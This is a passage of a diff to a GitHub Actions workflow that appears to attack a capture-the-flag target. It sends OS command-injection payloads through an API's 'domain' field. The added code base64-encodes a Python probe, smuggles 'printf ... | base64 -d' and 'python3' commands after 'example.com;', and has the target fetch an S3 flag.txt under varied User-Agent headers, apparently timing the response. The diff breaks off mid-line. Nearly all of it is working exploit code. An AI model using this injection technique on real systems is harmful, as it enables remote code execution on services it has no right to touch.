@@ -1,4 +1,4 @@
-name: Stage2-22-Test-Unsigned-S3
+name: Stage2-22-Unsigned-S3-Corrected
 
 on:
   push:
@@ -24,11 +24,12 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Test unsigned S3 requests from Lambda
+      - name: Test unsigned S3 requests
         run: |
           python3 - <<'PY'
           import os
           import time
+          import base64
           import requests
           from requests_aws4auth import AWS4Auth
 
@@ -46,7 +47,6 @@ jobs:
               "Amazon CloudFront",
               "CloudFront",
               "Mozilla/5.0",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
               "nslookupv2",
               "nslookup",
               "AWSLambda",
@@ -58,34 +58,24 @@ jobs:
           ]
 
           for user_agent in user_agents:
-              python_code = (
-                  "import urllib.request;"
+              inner_code = (
+                  "import urllib.request\n"
                   "url='https://s3.us-east-1.amazonaws.com/"
-                  "logad88e2b168aa387e/flag.txt';"
-                  f"req=urllib.request.Request(url, headers={{'User-Agent': {user_agent!r}}});"
-                  "urllib.request.urlopen(req, timeout=10).read(1)"
+                  "logad88e2b168aa387e/flag.txt'\n"
+                  f"req=urllib.request.Request(url, headers={{'User-Agent': {user_agent!r}}})\n"
+                  "with urllib.request.urlopen(req, timeout=10) as r:\n"
+                  "    r.read(1)\n"
               )
+
+              encoded = base64.b64encode(inner_code.encode()).decode()
 
               injected = (
                   "example.com; "
-                  "python3 -c "
-                  + repr(python_code)
-                  + " >/tmp/unsigned_result 2>&1 && sleep 8"
+                  "printf '%s' "
+                  + encoded
+                  + " | base64 -d > /tmp/unsigned_probe.py; "
+                  "python3 /tmp/unsigned_probe.py "
+                  ">/tmp/unsigned_result 2>&1 && sleep 8"
               )
 
-              start = time.monotonic()
-
-              response = requests.post(
-                  api,
-                  json={"domain": injected},
-                  auth=auth,
-                  timeout=30
-              )
-
-              elapsed = time.monotonic() - start
-
-              print("UA=" + user_agent)
-              print("HTTP=" + str(response.status_code))
-              print("ELAPSED=%.2f" % elapsed)
-              print("---")
-          PY
+              start = time.monot
